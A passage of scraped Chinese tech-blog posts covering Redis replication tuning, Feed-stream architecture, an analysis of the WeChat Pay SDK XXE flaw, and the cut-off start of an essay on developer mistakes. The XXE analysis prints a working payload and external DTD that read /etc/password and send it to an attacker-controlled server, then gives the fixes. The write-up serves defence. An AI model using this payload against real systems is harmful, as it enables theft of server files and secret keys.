SYNC)continue;if((server.unixtime-slave-&gt;repl_ack_time)&gt;server.repl_timeout){redisLog(REDIS_WARNING,\"Disconnectingtimedoutslave:%s\",replicationGetSlaveName(slave));freeClient(slave);}}}//此处省略无关代码……}1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/*Replicationcronfunction,called1timepersecond.*/voidreplicationCron(void){staticlonglongreplication_cron_loops=0;/*Nonblockingconnectiontimeout?*/if(server.masterhost&amp;&amp;(server.repl_state==REDIS_REPL_CONNECTING||slaveIsInHandshakeState())&amp;&amp;(time(NULL)-server.repl_transfer_lastio)&gt;server.repl_timeout){redisLog(REDIS_WARNING,\"TimeoutconnectingtotheMASTER...\");undoConnectWithMaster();}/*BulktransferI/Otimeout?*/if(server.masterhost&amp;&amp;server.repl_state==REDIS_REPL_TRANSFER&amp;&amp;(time(NULL)-server.repl_transfer_lastio)&gt;server.repl_timeout){redisLog(REDIS_WARNING,\"TimeoutreceivingbulkdatafromMASTER...Iftheproblempersiststrytosetthe'repl-timeout'parameterinredis.conftoalargervalue.\");replicationAbortSyncTransfer();}/*Timedoutmasterwhenweareanalreadyconnectedslave?*/if(server.masterhost&amp;&amp;server.repl_state==REDIS_REPL_CONNECTED&amp;&amp;(time(NULL)-server.master-&gt;lastinteraction)&gt;server.repl_timeout){redisLog(REDIS_WARNING,\"MASTERtimeout:nodatanorPINGreceived...\");freeClient(server.master);}//此处省略无关代码……/*Disconnecttimedoutslaves.*/if(listLength(server.slaves)){listIterli;listNode*ln;listRewind(server.slaves,&amp;li);while((ln=listNext(&amp;li))){redisClient*slave=ln-&gt;value;if(slave-&gt;replstate!=REDIS_REPL_ONLINE)continue;if(slave-&gt;flags&amp;REDIS_PRE_PSYNC)continue;if((server.unixtime-slave-&gt;repl_ack_time)&gt;server.repl_timeout){redisLog(REDIS_WARNING,\"Disconnectingtimedoutslave:%s\",replicationGetSlaveName(slave));freeClient(slave);}}}//此处省略无关代码……}需要注意的坑下面介绍与复制阶段连接超时有关的一些实际问题：（1）数据同步阶段：在主从节点进行全量复制bgsave时，主节点需要首先fork子进程将当前数据保存到RDB文件中，然后再将RDB文件通过网络传输到从节点。如果RDB文件过大，主节点在fork子进程+保存RDB文件时耗时过多，可能会导致从节点长时间收不到数据而触发超时；此时从节点会重连主节点，然后再次全量复制，再次超时，再次重连……这是个悲伤的循环。为了避免这种情况的发生，除了注意Redis单机数据量不要过大，另一方面就是适当增大repl-timeout值，具体的大小可以根据bgsave耗时来调整。（2）命令传播阶段：如前所述，在该阶段主节点会向从节点发送PING命令，频率由repl-ping-slave-period控制；该参数应明显小于repl-timeout值(后者至少是前者的几倍)。否则，如果两个参数相等或接近，网络抖动导致个别PING命令丢失，此时恰巧主节点也没有向从节点发送数据，则从节点很容易判断超时。（3）慢查询导致的阻塞：如果主节点或从节点执行了一些慢查询（如keys*或者对大数据的hgetall等），导致服务器阻塞；阻塞期间无法响应复制连接中对方节点的请求，可能导致复制超时。3.复制中断问题主从节点超时是复制中断的原因之一，除此之外，还有其他情况可能导致复制中断，其中最主要的是复制缓冲区溢出问题。复制缓冲区溢出前面曾提到过，在全量复制阶段，主节点会将执行的写命令放到复制缓冲区中，该缓冲区存放的数据包括了以下几个时间段内主节点执行的写命令：bgsave生成RDB文件、RDB文件由主节点发往从节点、从节点清空老数据并载入RDB文件中的数据。当主节点数据量较大，或者主从节点之间网络延迟较大时，可能导致该缓冲区的大小超过了限制，此时主节点会断开与从节点之间的连接；这种情况可能引起全量复制-&gt;复制缓冲区溢出导致连接中断-&gt;重连-&gt;全量复制-&gt;复制缓冲区溢出导致连接中断……的循环。复制缓冲区的大小由client-output-buffer-limitslave{hardlimit}{softlimit}{softseconds}配置，默认值为client-output-buffer-limitslave256MB64MB60，其含义是：如果buffer大于256MB，或者连续60s大于64MB，则主节点会断开与该从节点的连接。该参数是可以通过configset命令动态配置的（即不重启Redis也可以生效）。当复制缓冲区溢出时，主节点打印日志如下所示：需要注意的是，复制缓冲区是客户端输出缓冲区的一种，主节点会为每一个从节点分别分配复制缓冲区；而复制积压缓冲区则是一个主节点只有一个，无论它有多少个从节点。4.各场景下复制的选择及优化技巧在介绍了Redis复制的种种细节之后，现在我们可以来总结一下，在下面常见的场景中，何时使用部分复制，以及需要注意哪些问题。（1）第一次建立复制此时全量复制不可避免，但仍有几点需要注意：如果主节点的数据量较大，应该尽量避开流量的高峰期，避免造成阻塞；如果有多个从节点需要建立对主节点的复制，可以考虑将几个从节点错开，避免主节点带宽占用过大。此外，如果从节点过多，也可以调整主从复制的拓扑结构，由一主多从结构变为树状结构（中间的节点既是其主节点的从节点，也是其从节点的主节点）；但使用树状结构应该谨慎：虽然主节点的直接从节点减少，降低了主节点的负担，但是多层从节点的延迟增大，数据一致性变差；且结构复杂，维护相当困难。（2）主节点重启主节点重启可以分为两种情况来讨论，一种是故障导致宕机，另一种则是有计划的重启。主节点宕机主节点宕机重启后，runid会发生变化，因此不能进行部分复制，只能全量复制。实际上在主节点宕机的情况下，应进行故障转移处理，将其中的一个从节点升级为主节点，其他从节点从新的主节点进行复制；且故障转移应尽量的自动化，后面文章将要介绍的哨兵便可以进行自动的故障转移。安全重启：debugreload在一些场景下，可能希望对主节点进行重启，例如主节点内存碎片率过高，或者希望调整一些只能在启动时调整的参数。如果使用普通的手段重启主节点，会使得runid发生变化，可能导致不必要的全量复制。为了解决这个问题，Redis提供了debugreload的重启方式：重启后，主节点的runid和offset都不受影响，避免了全量复制。如下图所示，debugreload重启后runid和offset都未受影响：但debugreload是一柄双刃剑：它会清空当前内存中的数据，重新从RDB文件中加载，这个过程会导致主节点的阻塞，因此也需要谨慎。（3）从节点重启从节点宕机重启后，其保存的主节点的runid会丢失，因此即使再次执行slaveof，也无法进行部分复制。（4）网络中断如果主从节点之间出现网络问题，造成短时间内网络中断，可以分为多种情况讨论。第一种情况：网络问题时间极为短暂，只造成了短暂的丢包，主从节点都没有判定超时（未触发repl-timeout）；此时只需要通过REPLCONFACK来补充丢失的数据即可。第二种情况：网络问题时间很长，主从节点判断超时（触发了repl-timeout），且丢失的数据过多，超过了复制积压缓冲区所能存储的范围；此时主从节点无法进行部分复制，只能进行全量复制。为了尽可能避免这种情况的发生，应该根据实际情况适当调整复制积压缓冲区的大小；此外及时发现并修复网络中断，也可以减少全量复制。第三种情况：介于前述两种情况之间，主从节点判断超时，且丢失的数据仍然都在复制积压缓冲区中；此时主从节点可以进行部分复制。5.复制相关的配置这一节总结一下与复制有关的配置，说明这些配置的作用、起作用的阶段，以及配置方法等；通过了解这些配置，一方面加深对Redis复制的了解，另一方面掌握这些配置的方法，可以优化Redis的使用，少走坑。配置大致可以分为主节点相关配置、从节点相关配置以及与主从节点都有关的配置，下面分别说明。（1）与主从节点都有关的配置首先介绍最特殊的配置，它决定了该节点是主节点还是从节点：1)slaveof&lt;masterip&gt;&lt;masterport&gt;：Redis启动时起作用；作用是建立复制关系，开启了该配置的Redis服务器在启动后成为从节点。该注释默认注释掉，即Redis服务器默认都是主节点。2)repl-timeout60：与各个阶段主从节点连接超时判断有关，见前面的介绍。（2）主节点相关配置1)repl-diskless-syncno：作用于全量复制阶段，控制主节点是否使用diskless复制（无盘复制）。所谓diskless复制，是指在全量复制时，主节点不再先把数据写入RDB文件，而是直接写入slave的socket中，整个过程中不涉及硬盘；diskless复制在磁盘IO很慢而网速很快时更有优势。需要注意的是，截至Redis3.0，diskless复制处于实验阶段，默认是关闭的。2)repl-diskless-sync-delay5：该配置作用于全量复制阶段，当主节点使用diskless复制时，该配置决定主节点向从节点发送之前停顿的时间，单位是秒；只有当diskless复制打开时有效，默认5s。之所以设置停顿时间，是基于以下两个考虑：(1)向slave的socket的传输一旦开始，新连接的slave只能等待当前数据传输结束，才能开始新的数据传输(2)多个从节点有较大的概率在短时间内建立主从复制。3)client-output-buffer-limitslave256MB64MB60：与全量复制阶段主节点的缓冲区大小有关，见前面的介绍。4)repl-disable-tcp-nodelayno：与命令传播阶段的延迟有关，见前面的介绍。5)masterauth&lt;master-password&gt;：与连接建立阶段的身份验证有关，见前面的介绍。6)repl-ping-slave-period10：与命令传播阶段主从节点的超时判断有关，见前面的介绍。7)repl-backlog-size1mb：复制积压缓冲区的大小，见前面的介绍。8)repl-backlog-ttl3600：当主节点没有从节点时，复制积压缓冲区保留的时间，这样当断开的从节点重新连进来时，可以进行全量复制；默认3600s。如果设置为0，则永远不会释放复制积压缓冲区。9)min-slaves-to-write3与min-slaves-max-lag10：规定了主节点的最小从节点数目，及对应的最大延迟，见前面的介绍。（3）从节点相关配置1)slave-serve-stale-datayes：与从节点数据陈旧时是否响应客户端命令有关，见前面的介绍。2)slave-read-onlyyes：从节点是否只读；默认是只读的。由于从节点开启写操作容易导致主从节点的数据不一致，因此该配置尽量不要修改。6.单机内存大小限制在深入学习Redis（2）：持久化一文中，讲到了fork操作对Redis单机内存大小的限制。实际上在Redis的使用中，限制单机内存大小的因素非常之多，下面总结一下在主从复制中，单机内存过大可能造成的影响：（1）切主：当主节点宕机时，一种常见的容灾策略是将其中一个从节点提升为主节点，并将其他从节点挂载到新的主节点上，此时这些从节点只能进行全量复制；如果Redis单机内存达到10GB，一个从节点的同步时间在几分钟的级别；如果从节点较多，恢复的速度会更慢。如果系统的读负载很高，而这段时间从节点无法提供服务，会对系统造成很大的压力。（2）从库扩容：如果访问量突然增大，此时希望增加从节点分担读负载，如果数据量过大，从节点同步太慢，难以及时应对访问量的暴增。（3）缓冲区溢出：（1）和（2）都是从节点可以正常同步的情形（虽然慢），但是如果数据量过大，导致全量复制阶段主节点的复制缓冲区溢出，从而导致复制中断，则主从节点的数据同步会全量复制-&gt;复制缓冲区溢出导致复制中断-&gt;重连-&gt;全量复制-&gt;复制缓冲区溢出导致复制中断……的循环。（4）超时：如果数据量过大，全量复制阶段主节点fork+保存RDB文件耗时过大，从节点长时间接收不到数据触发超时，主从节点的数据同步同样可能陷入全量复制-&gt;超时导致复制中断-&gt;重连-&gt;全量复制-&gt;超时导致复制中断……的循环。此外，主节点单机内存除了绝对量不能太大，其占用主机内存的比例也不应过大：最好只使用50%-65%的内存，留下30%-45%的内存用于执行bgsave命令和创建复制缓冲区等。7.infoReplication在Redis客户端通过infoReplication可以查看与复制相关的状态，对于了解主从节点的当前状态，以及解决出现的问题都会有帮助。主节点：从节点：对于从节点，上半部分展示的是其作为从节点的状态，从connectd_slaves开始，展示的是其作为潜在的主节点的状态。infoReplication中展示的大部分内容在文章中都已经讲述，这里不再详述。七、总结下面回顾一下本文的主要内容：1、主从复制的作用：宏观的了解主从复制是为了解决什么样的问题，即数据冗余、故障恢复、读负载均衡等。2、主从复制的操作：即slaveof命令。3、主从复制的原理：主从复制包括了连接建立阶段、数据同步阶段、命令传播阶段；其中数据同步阶段，有全量复制和部分复制两种数据同步方式；命令传播阶段，主从节点之间有PING和REPLCONFACK命令互相进行心跳检测。4、应用中的问题：包括读写分离的问题（数据不一致问题、数据过期问题、故障切换问题等）、复制超时问题、复制中断问题等，然后总结了主从复制相关的配置，其中repl-timeout、client-output-buffer-limitslave等对解决Redis主从复制中出现的问题可能会有帮助。主从复制虽然解决或缓解了数据冗余、故障恢复、读负载均衡等问题，但其缺陷仍很明显：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制；这些问题的解决，需要哨兵和集群的帮助，我将在后面的文章中介绍，欢迎关注。参考文献《Redis开发与运维》《Redis设计与实现》《Redis实战》redis主从复制（1）—慢查询导致复制中断TopRedisHeadachesforDevops–ReplicationBufferredis主从复制（2）—replicationbuffer与replicationbackloghttps://github.com/antirez/redis/issues/918https://blog.csdn.net/qbw2010/article/details/50496982https://mp.weixin.qq.com/s?__biz=MzIxMzEzMjM5NQ==&amp;mid=2651029484&amp;idx=1&amp;sn=5882f4c7c390a0a0e4f6dfd872e203b5&amp;chksm=8c4caae8bb3b23fe77909e307d45a071186f55069e5207602c61383eab573885615c1d835904&amp;mpshare=1&amp;scene=1&amp;srcid=0327SokqtxEY3WojWNDMHLYl#rd1赞收藏评论", "url_object_id": "aa95d1c9ae4721218650bfa651e5af8c"},{"title": "关于 Feed 流的几个热门问题", "url": "http://blog.jobbole.com/114156/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2011/11/software-development-logo.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,0,9, ,·", "content": "本文作者：伯乐在线-v7。未经作者许可，禁止转载！欢迎加入伯乐在线专栏作者。0x00前言本篇聊一下Feed流技术，由于这个话题在业界有丰富的实践经验，所以我特意选了个小的切入点，从相对微观的角度说几个具体的问题，避免一些无意义的重复。希望提炼实践中的具体问题来做讨论，使事情变得更有实际意义。0x01先行资料什么是Feed流如何设计Twitter这样的系统架构如何打造千万级Feed流系统0x02关于模型当要做一个Feed流，摆在我们眼前的第一个问题就是到底选推模型还是选拉模型，因为这个选择将影响接下来一系列的架构方式。推模型or拉模型推模型和拉模型各自的优缺点已经被罗列了很多了，比如推模型的存储量大，或者拉模型的效率可能低，但如果你从无到有做这个事情，这些优缺点的罗列还是无法帮助你做出最初的决定，所谓的“知道了许多道理，还是过不好这一生”，当然除非你有实际的构造大流量Feed流的经验。然而根据我们的经验：基于正确规范的架构和基础设施，对于一个千万日活量级的应用Feed流，拉模型完全可以扛得住。我想，上面这个结论是很有意义的，尤其是对中小创业公司，因为拉模型本身节省存储资源，开发成本低，上线速度快，在业务爆发之前做这样一个Feed流，有这样一个明确经验可以帮助你快速做出决定。另外，上面说的千万日活，并不是说就是拉模型的上限，而是说，如果你做到千万日活，你将会有丰富的实践经验帮助你走下一步，那时也会有更多的资源让你使用，是继续深挖拉模型潜能，还是上推拉结合消灭性能问题，将是另外一个够挑战的问题了。推模型的原罪上一节我的描述有些极端，本意上我是想给出更明确的实践结论，因为对于推拉模型的积累对比已经够多了，现在难的似乎是做决定时的信心。那这一节，我就来聊推模型的几个问题。耗存储。推模型可以理解为给每个粉丝维护一个单独的存储，举例来说，如果某个大V有一千万粉丝，他发的一条内容，将被存储一千万份，这个存储放大是非常可观的。于是这里就会常见的问题：一、有多少存储资源能用，这些资源贵不贵？二、如果省掉这些资源存储，响应时间性能到底能打多少折扣，这些折扣值不值？这是个时间和空间的冲突，程序员每天都在做这种问题的衡量，每个系统的要求基准也不一样，我就不妄下结论了。写峰值。推模型有一个写峰值的问题，通常，我们做推模型，给粉丝写数据的时候一般是离线的，也就是大V发布完内容，触发离线写任务推给各个粉丝。可大V是少数，大部分时候，都是普通用户在发布，写任务没有那么多，这时，离线写任务的worker数可能用不了几个，可一旦大V发布了内容，这个写任务会骤增，突然来一个大峰值，如何处理这个峰值是个问题。有些方案：一、把资源调度系统做的超级棒，worker数量自动化跟着调整，峰值来了的时候，worker自动迅速扩容，消费离线任务，并在离线任务处理完毕之后缩容，避免资源浪费，这个调度确实需要很棒，因为大多时候，Feed流对这些任务的要求是很严苛的，比如，产品上希望粉丝至少也是在分钟级看到大V发的内容，甚至秒级，这对调度系统的挑战是巨大的。二、推拉结合，大V走拉模型逻辑，这个方案的问题就是，你其实做了两套系统，开发成本大。避不开的业务逻辑。这一点是从业务逻辑开发上来说的，这个也是在具体业务开发过程中推模型让人觉得很难受的点，就是：当我解决很多问题之后，从业务逻辑开发层面，我还是避不开很多业务逻辑。为什么这么说呢，就是在推模型里，每个粉丝都存有一个属于他的数据，但这部分数据在接口设计和数据返回上，也仅仅就是元数据，这份元数据，还是要经过很多处理才能返回给用户，比如过滤、Format，我们希望推模型维护的那个存储是一份尽可能干净的数据，但事情却没那么简单。不过，以上是我个人的一些总结，由于在推模型上我没有走的更远，这些问题到底是不是真正的问题，欢迎来喷。0x03关于数据模型的事情就不过多说了，再来聊几个关于数据的具体问题。有状态与无状态这是Feed流的API接口设计相关的问题。举个例子，在拉取Feed流数据时候，API层面基于数量offset/limit的分页方案是完全不行的，因为用户Feed流的新数据会insert到流最开始位置，仅仅给出offset会导致分页数据错乱，所以会给出一种after/limit的分页方案，就是有一个标志数据，意义是“从after这个数据向后取limit条数据”；但是，这仅仅是一个干净的Feed流的情况下，在实际的业务需求中，Feed流中的数据会更复杂，复杂到打乱这个看起来可行的分页方式。以分页这个例子来说，它为什么会这么脆弱呢?我总结是因为API的数据请求是无状态的，用户在取第二页数据的时候，并不知道取第一页数据时到底发生了什么，仅仅知道在接口层面传递的几个值（offset/after/limt），而许多时候尤其是对于Feed流的一些时候这些值不够用，导致数据拉取变得棘手。所以，如果Feed流的数据获取是有状态就好了，就像浏览器与服务器之间的Session，保持用户一个访问周期的上下文数据，这样想做什么就都好做了。数据Format通常，Feed流中的数据会来自多个不同的源，最后返回给用户之前需要做数据的Format，这个过程是个性能黑洞，经常包含了很多IO，你可能要读大量存储，读大量RPC来获取到数据才能成功组装。所以针对数据Format有很多性能优化的点，包括不限于：消灭慢查询、减少调用放大、并行获取数据、做好缓存、操作批量。要做好性能优化，好的结构是必需的，比如要减少调用放大，那就要尽量保证数据复用和批量获取，只有你的代码结构好，才会有更合适的地方去获取数据和复用数据；也同样，只有你把可以并行部分都很清晰的摘离出来了，才能更合适地去做统一并行。而诸如消灭慢查询、做好缓存，此类其他细节也都是重要的，这里就不展开。过滤几乎所有的Feed流都有过滤需求，比如对已经读过的内容进行过滤，或者对已经被作者删除的内容进行过滤。过滤是个具体的事情，有的时候你仅仅需要元数据就能过滤，有的时候你需要对拿到完整数据才能过滤。总结一句话就是过滤的繁琐与否取决于产品需求，但好的结构可以让过滤变得更符合逻辑，性能表现更好。0x04结语Feed流是个不小的系统，三言两语只是管中窥豹，长时间没写分享文章了行文也变得不太流畅，希望看完这篇你会有所收获吧。打赏支持我写出更多好文章，谢谢！打赏作者打赏支持我写出更多好文章，谢谢！任选一种支付方式1赞1收藏评论关于作者：v7微博：@_v7__个人主页·我的文章·17·", "url_object_id": "7b4b289d21745010a22e3afbfc59d82c"},{"title": "谈谈微信支付曝出的漏洞", "url": "http://blog.jobbole.com/114197/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/09/3fb6592ac92133a71f0ae78e43683e83.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,0,6, ,·", "content": "原文出处：编程迷思一、背景昨天（2018-07-04）微信支付的SDK曝出重大漏洞（XXE漏洞），通过该漏洞，攻击者可以获取服务器中目录结构、文件内容，如代码、各种私钥等。获取这些信息以后，攻击者便可以为所欲为，其中就包括众多媒体所宣传的“0元也能买买买”。漏洞报告地址；http://seclists.org/fulldisclosure/2018/Jul/3二、漏洞原理1.XXE漏洞此次曝出的漏洞属于XXE漏洞，即XML外部实体注入（XMLExternalEntityInjection）。XML文档除了可以包含声明和元素以外，还可以包含文档类型定义（即DTD）；如下图所示。在DTD中，可以引进实体，在解析XML时，实体将会被替换成相应的引用内容。该实体可以由外部引入(支持http、ftp等协议，后文以http为例说明)，如果通过该外部实体进行攻击，就是XXE攻击。可以说，XXE漏洞之所以能够存在，本质上在于在解析XML的时候，可以与外部进行通信；当XML文档可以由攻击者任意构造时，攻击便成为可能。在利用XXE漏洞可以做的事情当中，最常见最容易实现的，便是读取服务器的信息，包括目录结构、文件内容等；本次微信支付爆出的漏洞便属于这一种。2.微信支付漏洞本次漏洞影响的范围是：在微信支付异步回调接口中，使用微信支付SDK进行XML解析的应用。注意这里的SDK是服务器端的SDK，APP端使用SDK并不受影响。SDK下载地址如下（目前微信官方宣传漏洞已修复）：https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zipSDK中导致漏洞的代码是WXPayUtil工具类中的xmlToMap()方法：如上图所示，由于在解析XML时没有对外部实体的访问做任何限制，如果攻击者恶意构造xml请求，便可以对服务器进行攻击。下面通过实例介绍攻击的方法。3.攻击复现下面在本机环境下进行复现。假设本地的web服务器127.0.0.1:8080中存在POST接口：/wxpay/callback，该接口中接收xml字符串做参数，并调用前述的WXPayUtil.xmlToMap(strXml)对xml参数进行解析。此外，/etc/password中存储了重要的密码数据（如password1234）。攻击时构造的请求如下：其中xml内容如下：&lt;?xmlversion=\"1.0\"encoding=\"utf-8\"?&gt;&lt;!DOCTYPEroot[&lt;!ENTITY%fileSYSTEM\"file:///etc/password\"&gt;&lt;!ENTITY%xxeSYSTEM\"http://127.0.0.1:9000/xxe.dtd\"&gt;%xxe;]&gt;123456&lt;?xmlversion=\"1.0\"encoding=\"utf-8\"?&gt;&lt;!DOCTYPEroot[&lt;!ENTITY%fileSYSTEM\"file:///etc/password\"&gt;&lt;!ENTITY%xxeSYSTEM\"http://127.0.0.1:9000/xxe.dtd\"&gt;%xxe;]&gt;其中/etc/password为要窃取的对象，http://127.0.0.1:9000/xxe.dtd为攻击者服务器中的dtd文件，内容如下：&lt;!ENTITY%shell\"&lt;!ENTITY%uploadSYSTEM'http://127.0.0.1:9000/evil/%file;'&gt;\"&gt;%shell;%upload;1234&lt;!ENTITY%shell\"&lt;!ENTITY%uploadSYSTEM'http://127.0.0.1:9000/evil/%file;'&gt;\"&gt;%shell;%upload;通过xml+dtd文件，攻击者便可以在服务器http://127.0.0.1:9000中收到如下请求：http://127.0.0.1:9000/evil/password1234这样，攻击者便得到了/etc/password文件的内容。在本例中，攻击者窃取了/etc/password文件中的内容，实际上攻击者还可以获取服务器中的目录结构以及其他文件，只要启动web应用的用户具有相应的读权限。如果获取的信息比较复杂，如包含特殊符号，无法直接通过http的URL发送，则可以采用对文件内容进行Base64编码等方法解决。三、漏洞的解决解决该漏洞的原理非常简单，只要禁止解析XML时访问外部实体即可。漏洞曝出以后，微信进行了紧急修复，一方面是更新了SDK，并提醒开发者使用最新的SDK；SDK中修复代码如下：加入了如下两行代码：documentBuilderFactory.setExpandEntityReferences(false);documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true);12documentBuilderFactory.setExpandEntityReferences(false);documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true);更新：微信表示上述2条语句无法禁止该漏洞，又双叒叕更新了官方SDK，加了以下语句（对于微信的这波操作，不知如何评价）：documentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);documentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\",false);documentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\",false);documentBuilderFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\",false);documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true);documentBuilderFactory.setXIncludeAware(false);documentBuilderFactory.setExpandEntityReferences(false);1234567documentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);documentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\",false);documentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\",false);documentBuilderFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\",false);documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING,true);documentBuilderFactory.setXIncludeAware(false);documentBuilderFactory.setExpandEntityReferences(false);此外，微信官方也给出了关于XXE漏洞的最佳安全实践，可以参考：https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5笔者本人使用上述方案中建议的如下代码修复了该漏洞：DocumentBuilderFactorydocumentBuilderFactory=DocumentBuilderFactory.newInstance();documentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);DocumentBuilderdocumentBuilder=documentBuilderFactory.newDocumentBuilder();……1234DocumentBuilderFactorydocumentBuilderFactory=DocumentBuilderFactory.newInstance();documentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);DocumentBuilderdocumentBuilder=documentBuilderFactory.newDocumentBuilder();……四、扩展与反思1.危害不只是“0元也能买买买”在很多媒体的报道中，强调该漏洞的风险在于攻击者可以不支付也可以获得商品。确实，攻击者在通过上述漏洞获得微信支付的秘钥以后，有不止一种途径可以做到不支付就获得商品：例如，攻击者首先在系统中下单，获得商户订单号；然后便可以调用微信支付的异步回调，其中的签名参数便可以使用前面获取的秘钥对订单号等信息进行MD5获得；这样攻击者的异步回调就可以通过应用服务器的签名认证，从而获得商品。不过，在很多有一定规模的购物网站（或其他有支付功能的网站），会有对账系统，如定时将系统中的订单状态与微信、支付宝的后台对比，如果出现不一致可以及时报警并处理，因此该漏洞在这方面的影响可能并没有想象的那么大。然而，除了“0元也能买买买”，攻击者可以做的事情还有很多很多；理论上来说，攻击者可能获得应用服务器上的目录结构、代码、数据、配置文件等，可以根据需要进行进一步破坏。2.漏洞不限于微信支付SDK虽然微信支付曝出该漏洞受到了广泛关注，但该漏洞绝不仅仅存在于微信支付中：由于众多XML解析器默认不会禁用对外部实体的访问，因此应用的接口如果有以下几个特点就很容易掉进XXE漏洞的坑里：（1）接口使用xml做请求参数（2）接口对外公开，或容易获得：例如一些接口提供给外部客户调用，或者接口使用http很容易抓包，或者接口比较容易猜到(如微信支付的异步回调接口)（3）接口中解析xml参数时，没有禁用对外部实体的访问建议大家最好检查一下自己的应用中是否有类似的漏洞，及时修复。3.xml与jsonxml与json是系统间交互常用的两种数据格式，虽然很多情况下二者可以互换，但是笔者认为，json作为更加轻量级更加纯粹的数据格式，更适合于系统间的交互；而xml，作为更加重量级更加复杂的数据格式，其DTD支持自定义文档类型，在更加复杂的配置场景下有着更好的效果，典型的场景如spring相关的配置。4.题外话：微信支付的签名认证在前面曾经提到，应用中存储的秘钥一旦泄露，攻击者便可以完全绕过签名认证，这是因为微信支付使用的是对称式的签名认证：微信方和应用方，使用相同的秘钥对相同的明文进行MD5签名，只要应用方的秘钥泄露，签名认证就完全成了摆设。在这方面支付宝的做法更规范也更安全：支付宝为应用生成公私钥对，公钥由应用方保存，私钥由支付宝保存；在回调时，支付宝使用私钥进行签名，应用方使用公钥进行验证；这样只要支付宝保存的私钥不泄露，攻击者只有公钥则难以通过签名认证。参考文献https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5http://seclists.org/fulldisclosure/2018/Jul/3https://www.cnblogs.com/tongwen/p/5194483.html1赞1收藏评论", "url_object_id": "f2c4471ed0ef1f9a2f5eb6a1621f2f3b"},{"title": "我作为开发者犯过的两次愚蠢的错误", "url": "http://blog.jobbole.com/114164/", "create_date": "2018-09-13", "front_image_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1fsrtjp2o93j20hs0audih.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,2,9, ,·", "content": "本文由伯乐在线-dimple11翻译，刘唱校稿。未经许可，禁止转载！英文出处：ZacharyKuhn。欢迎加入翻译组。上周我和同事们简单地聊了聊我们工作中搞砸的那些事儿。如今早已不再犯那些错了，所以想起过去就觉得很好笑。但是笑归笑，其实当时犯的这些错让我们受益颇深。（credit：Snecx）分享自己犯错的经历至关重要，能让别人从中吸取经验教训，而且可能让他们工作起来更上手。我在这儿记录了几条自己最近犯的错。为什么有那么多生产数据库被误删？几个月之前，Reddit上发了一篇文章，写的是一个入门级开发人员在上班第一天就误删了生产数据库。我们看到类似这种有人犯了特大的、不可磨灭的错误的文章，都不免心生畏惧。我们意识到自己并不是没可能犯那种错——大多数时候都是悬崖勒马。我在干第一份工作的时候，有一个高级数据库管理员在上班第一天就误删了生产数据库，这种例子简直比比皆是。工作团队用一周前旧的数据库备份帮他弥补了过失，让他保住了工作。如今十年过去了，都仍用这件事拿他开涮。今年年初有天早上，我被叫去调查一个客户生产中出现的问题。他们本来要针对一小部分用户进行产品的β测试，但是他们的网站首页突然什么都显示不出来了。我猜想可能是系统有bug或者有漏洞所致。我登录进生产机器，调出数据库，发现articles表是空的。OK，这证实了网页显示空白的情况。用户表里面还是有用户的，这就奇怪了，所以我们丢了所有的articles，但起码他们的测试用户仍有他们的账号，我们可以解释说是这是个测试版，而且这种事情时有发生。接下来一会儿我就犯迷糊了。我记不清楚自己干了什么，我认为自己不会蠢到在控制台窗口输入了删除表中用户的指令，可情况就是这样——现在既没有articles表，也没有用户表。我呆坐着，感觉有点震惊。然后我的大脑高速运转，开始想办法修复问题。我真的删掉用户表了吗？是的。我们运行备份数据库了吗？没有。该怎么向客户解释呢？我不知道。我记得自己去找了项目经理，坐在她旁边解释事情发生的经过，articles表中没有数据了，所以网站看上去是空的。哦对了，我还误删了用户表。现在他们需要重新邀请所有的用户——如果他们还能想清楚用户都有谁的话。哎呀。我回到自己的座位上，感觉深受挫败。但是我觉得事情有些蹊跷，我们怎么可能一开始就丢了所有的articles表呢？于是我继续深究下去，一方面是因为难以接受这个结果，一方面是想挽回颜面。之后过了一小会儿，我注意到了关键问题。服务器上还有另外5个数据库，其中一个的名字和我正在看的那个数据库的名字非常相似。我一检查，发现articles都在里面，用户表也完好无损。事实证明是因为配置发生变化，无意间让它变成了生产数据库，导致网站指向了全新的数据库。我在里面看到的那些用户呢？种子数据罢了。真是如释重负！一早上神经紧绷、胃酸翻涌，搞得我浑身不适，但好在我们“修复”了所有的数据，并且找到了问题真正的症结所在，没有提前宣布误删数据库的坏消息。这个小插曲让我们受益良多，最简单的一个就是：现在我们总是在给数据库做备份……这可能是我们开发人员最有效的胃药。总赶进度，却从来赶不上进度我最近所犯的另一个突出错误没那么戏剧化，实际上是由一个个小错误最终累积造成了大麻烦。我们项目开发的一大挑战就是时间紧张（但也不全是？）第一次开会时，我们一致觉得项目需要的时间比我们能够拿出来的时间多了一倍。从项目一开始，截止日期就步步紧逼，所以我们三下五除二就通过了认证环节，以便进入客户真正关心的功能环节。我只是之前在一个单页app中落实了一次认证，但仍然没有彻底理解app各